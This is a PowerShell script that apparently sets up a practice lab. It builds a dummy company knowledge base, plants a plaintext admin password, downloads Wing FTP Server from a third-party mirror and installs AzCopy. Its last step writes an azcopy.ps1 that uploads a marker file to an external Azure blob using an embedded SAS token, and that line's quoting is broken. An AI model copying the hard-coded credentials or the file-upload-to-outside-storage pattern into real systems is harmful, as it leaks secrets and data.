# Base Path
$basePath = "C:\Knowledge Base"

# Folder Structure
$folders = @(
    "Tech",
    "Business",
    "Employees",
    "HR",
    "Finances",
    "Onboarding",
    "Compliance"
)

# Create Base Folder
New-Item -Path $basePath -ItemType Directory -Force | Out-Null

# Create Subfolders
foreach ($folder in $folders) {
    New-Item -Path (Join-Path $basePath $folder) -ItemType Directory -Force | Out-Null
}

# Lorem Ipsum Text
$lorem = @"
Lorem ipsum dolor sit amet, consectetur adipiscing elit. 
Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. 
Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris.
"@

# --------------------
# TECH FILES
# --------------------
$techPath = Join-Path $basePath "Tech"

Set-Content -Path (Join-Path $techPath "Logging in.txt") -Value "Login with admin:CrazyPassword"
Set-Content -Path (Join-Path $techPath "Connecting to the network.txt") -Value $lorem
Set-Content -Path (Join-Path $techPath "Accessing internal resources.txt") -Value $lorem
Set-Content -Path (Join-Path $techPath "Report Phishing.txt") -Value $lorem
Set-Content -Path (Join-Path $techPath "How to use Outlook.txt") -Value $lorem
Set-Content -Path (Join-Path $techPath "How to navigate the knowledge base.txt") -Value $lorem

# --------------------
# BUSINESS FILES
# --------------------
$businessPath = Join-Path $basePath "Business"

Set-Content -Path (Join-Path $businessPath "Mission Statement.txt") -Value $lorem
Set-Content -Path (Join-Path $businessPath "Vision Statement.txt") -Value $lorem
Set-Content -Path (Join-Path $businessPath "Future Goals.txt") -Value $lorem
Set-Content -Path (Join-Path $businessPath "About the Company.txt") -Value $lorem
Set-Content -Path (Join-Path $businessPath "History.txt") -Value $lorem

# --------------------
# EMPLOYEE FILES
# --------------------
$employeePath = Join-Path $basePath "Employees"

Set-Content -Path (Join-Path $employeePath "John.txt") -Value $lorem
Set-Content -Path (Join-Path $employeePath "Jake.txt") -Value $lorem
Set-Content -Path (Join-Path $employeePath "Joanne.txt") -Value $lorem
Set-Content -Path (Join-Path $employeePath "Jane.txt") -Value $lorem
Set-Content -Path (Join-Path $employeePath "David.txt") -Value $lorem

# --------------------
# HR FILES
# --------------------
$hrPath = Join-Path $basePath "HR"

Set-Content -Path (Join-Path $hrPath "Rules.txt") -Value $lorem
Set-Content -Path (Join-Path $hrPath "Regulations.txt") -Value $lorem
Set-Content -Path (Join-Path $hrPath "Documentation.txt") -Value $lorem
Set-Content -Path (Join-Path $hrPath "Presentations.txt") -Value $lorem

# --------------------
# FINANCE FILES
# --------------------
$financePath = Join-Path $basePath "Finances"

Set-Content -Path (Join-Path $financePath "2022.txt") -Value $lorem
Set-Content -Path (Join-Path $financePath "2023.txt") -Value $lorem
Set-Content -Path (Join-Path $financePath "2024.txt") -Value $lorem
Set-Content -Path (Join-Path $financePath "2025.txt") -Value $lorem

# --------------------
# ONBOARDING FILES
# --------------------
$onboardingPath = Join-Path $basePath "Onboarding"

Set-Content -Path (Join-Path $onboardingPath "Getting your account.txt") -Value $lorem
Set-Content -Path (Join-Path $onboardingPath "Setting your password.txt") -Value $lorem
Set-Content -Path (Join-Path $onboardingPath "Resetting your password.txt") -Value $lorem
Set-Content -Path (Join-Path $onboardingPath "Employee Handbook.txt") -Value $lorem
Set-Content -Path (Join-Path $onboardingPath "Training.txt") -Value $lorem

# --------------------
# COMPLIANCE FILES
# --------------------
$compliancePath = Join-Path $basePath "Compliance"

Set-Content -Path (Join-Path $compliancePath "HIPAA.txt") -Value $lorem
Set-Content -Path (Join-Path $compliancePath "PCI DSS.txt") -Value $lorem
Set-Content -Path (Join-Path $compliancePath "GDPR.txt") -Value $lorem

Write-Host "Knowledge Base structure created successfully."

# --------------------
# DURKEE FILE
# --------------------

$durkeePath = "C:\Administrator"

# Ensure directory exists
New-Item -Path $durkeePath -ItemType Directory -Force | Out-Null

# Create file with content
Set-Content -Path (Join-Path $durkeePath "The Durkee Files.txt") -Value "I'm Durking it"

Write-Host "Durkee file created successfully."

# --------------------
# DOWNLOAD SOFTWARE
# --------------------

# Create download folder
$downloadPath = "C:\Installers"
New-Item -Path $downloadPath -ItemType Directory -Force | Out-Null

# URLs
$wingFtpUrl = "https://download2.fileeagle.com/files/2025/05/WingFtpServer.exe"
$azCopyUrl = "https://aka.ms/downloadazcopy-v10-windows"

# Destination files
$wingFtpFile = Join-Path $downloadPath "WingFtpServer.exe"
$azCopyZip = Join-Path $downloadPath "AzCopy.zip"

Write-Host "Downloading Wing FTP Server..."
Invoke-WebRequest -Uri $wingFtpUrl -OutFile $wingFtpFile

Write-Host "Downloading AzCopy..."
Invoke-WebRequest -Uri $azCopyUrl -OutFile $azCopyZip

Write-Host "Downloads completed."

# --------------------
# EXTRACT AZCOPY + ADD TO SYSTEM PATH
# --------------------

$azCopyZip = "C:\Installers\AzCopy.zip"
$azCopyExtractPath = "C:\Installers\AzCopyExtracted"
$azCopyFinalPath = "C:\Program Files\AzCopy"

Write-Host "Extracting AzCopy..."

# Create extraction folder
New-Item -Path $azCopyExtractPath -ItemType Directory -Force | Out-Null

# Extract zip
Expand-Archive -Path $azCopyZip -DestinationPath $azCopyExtractPath -Force

# Find azcopy.exe (zip contains versioned folder)
$azExe = Get-ChildItem -Path $azCopyExtractPath -Recurse -Filter "azcopy.exe" | Select-Object -First 1

# Create final install location
New-Item -Path $azCopyFinalPath -ItemType Directory -Force | Out-Null

# Copy executable to final location
Copy-Item $azExe.FullName -Destination (Join-Path $azCopyFinalPath "azcopy.exe") -Force

Write-Host "AzCopy copied to $azCopyFinalPath"

# --------------------
# ADD TO SYSTEM PATH
# --------------------

Write-Host "Adding AzCopy to System PATH..."

$currentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")

if ($currentPath -notlike "*$azCopyFinalPath*") {
    [Environment]::SetEnvironmentVariable(
        "Path",
        $currentPath + ";" + $azCopyFinalPath,
        "Machine"
    )
    Write-Host "AzCopy added to system PATH."
} else {
    Write-Host "AzCopy already exists in PATH."
}

Write-Host "AzCopy setup complete."

# --------------------
# AZURE SCRIPT
# --------------------

$azurePath = "C:\Administrator"

# Ensure directory exists
New-Item -Path $azurePath -ItemType Directory -Force | Out-Null

# Create file with content
Set-Content -Path (Join-Path $azurePath "azcopy.ps1") -Value "& "C:\Program Files\AzCopy\azcopy.exe" copy "C:\Administrator\The Durkee Files.txt" "https://feb5practice.blob.core.windows.net/feb5practice?sp=rw&st=2026-02-05T15:41:40Z&se=2026-02-06T04:59:40Z&spr=https&sv=2024-11-04&sr=c&sig=BisjDikoYvkNDFQieSgOp1O8jDBjwCFYJbjLynm3wRw%3D"

Write-Host "Durkee file created successfully."
